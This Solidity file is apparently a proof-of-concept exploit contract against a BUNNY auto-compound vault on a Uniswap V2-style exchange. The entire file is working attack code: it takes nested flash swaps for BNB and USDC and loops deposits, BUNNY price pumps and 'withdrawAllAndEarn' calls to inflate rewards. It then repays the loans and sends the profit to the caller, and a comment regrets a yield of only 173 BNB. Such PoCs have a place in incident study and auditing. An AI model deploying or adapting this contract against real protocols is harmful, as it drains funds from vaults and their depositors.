// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAutoCompoundVault {
    function depositAll() external;
    function withdrawAllAndEarn() external;
}
//this poc just get 173 bnb. so bad
contract Exploit {
    IUniswapV2Factory private uniFactory;
    IUniswapV2Router02 private uniRouter;
    IUniswapV2Pair private usdcBnbPair;
    IUniswapV2Pair private bnbBunnyPair;
    IUniswapV2Pair private usdcDaiPair;
    IUniswapV2Pair private daiBnbPair;
    IAutoCompoundVault private vault;
    IERC20 private usdc;
    IERC20 private bnb;
    IERC20 private dai;
    IERC20 private bunny;

    constructor(
        address _uniFactory,
        address _uniRouter,
        address _bnb,
        address _dai,
        address _usdc, 
        address _bunny
    ) {
        uniFactory = IUniswapV2Factory(_uniFactory);
        uniRouter = IUniswapV2Router02(_uniRouter);
        bnb = IERC20(_bnb);
        bnb.approve(_uniRouter, type(uint256).max);
        dai = IERC20(_dai);
        dai.approve(_uniRouter, type(uint256).max);
        usdc = IERC20(_usdc);
        usdc.approve(_uniRouter, type(uint256).max);
        bunny = IERC20(_bunny);
        bunny.approve(_uniRouter, type(uint256).max);
    }

    function start(address _vault) external {
        vault = IAutoCompoundVault(_vault);
        usdcBnbPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(bnb)));
        bnbBunnyPair = IUniswapV2Pair(uniFactory.getPair(address(bunny),address(bnb)));
        usdcDaiPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));
        daiBnbPair = IUniswapV2Pair(uniFactory.getPair(address(dai),address(bnb)));

        bool t0 = daiBnbPair.token0() == address(bnb);        
        if (t0) {
            daiBnbPair.swap(2_999e18, 0, address(this), new bytes(0x1));
        } else {
            daiBnbPair.swap(0, 2_999e18, address(this), new bytes(0x1));
        }
        bnb.transfer(msg.sender, bnb.balanceOf(address(this)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (msg.sender == address(daiBnbPair)) {
            uint256 amount = amount0 > 0 ? amount0 : amount1; 
            //borrow usdc from usdcDaiPair
            bool t0 = usdcDaiPair.token0() == address(usdc);        
            if (t0) {
                usdcDaiPair.swap(300_000e18, 0, address(this), new bytes(0x1));
            } else {
                usdcDaiPair.swap(0, 300_000e18, address(this), new bytes(0x1));
            }
            bnb.transfer(address(msg.sender), amount * 1000 / 997 + 1);
        } 
        else if (msg.sender == address(usdcDaiPair)) {
            uint256 amount = amount0 > 0 ? amount0 : amount1; 
            
            uniRouter.addLiquidity(
                address(usdc), address(bnb),
                300_000e18, 1_000e18,
                0, 0,
                address(this),
                block.timestamp
            );
            IERC20(address(usdcBnbPair)).approve(address(vault), type(uint256).max);
            IERC20(address(usdcBnbPair)).approve(address(uniRouter), type(uint256).max);
            address[] memory path = new address[](2);
            for(uint256 i; i < 50; i++) {
                //deposit lp to vault
                vault.depositAll();                
                //pump bunny                
                path[0] = address(bnb);
                path[1] = address(bunny);
                uniRouter.swapExactTokensForTokens(
                    bnb.balanceOf(address(this)), 
                    0, 
                    path, 
                    address(this), 
                    block.timestamp
                );
                //withdraw lp from vault
                vault.withdrawAllAndEarn();
                //sell bunny
                path[0] = address(bunny);
                path[1] = address(bnb);
                uniRouter.swapExactTokensForTokens(
                    bunny.balanceOf(address(this)), 
                    0, 
                    path, 
                    address(this), 
                    block.timestamp
                );                
            }
            //burn lp
            uniRouter.removeLiquidity(
                address(usdc), address(bnb),
                IERC20(address(usdcBnbPair)).balanceOf(address(this)),
                0, 0,
                address(this),
                block.timestamp
            );            
            //buy usdc
            uint256 usdcAmount = usdc.balanceOf(address(this));
            path[0] = address(bnb);
            path[1] = address(usdc);
            uniRouter.swapExactTokensForTokens(
                303e18, 
                0, 
                path, 
                address(this), 
                block.timestamp
            );
            usdc.transfer(address(msg.sender), amount * 1000 / 997 + 1);
        } else {
            revert("invalid pair");
        }
    }

}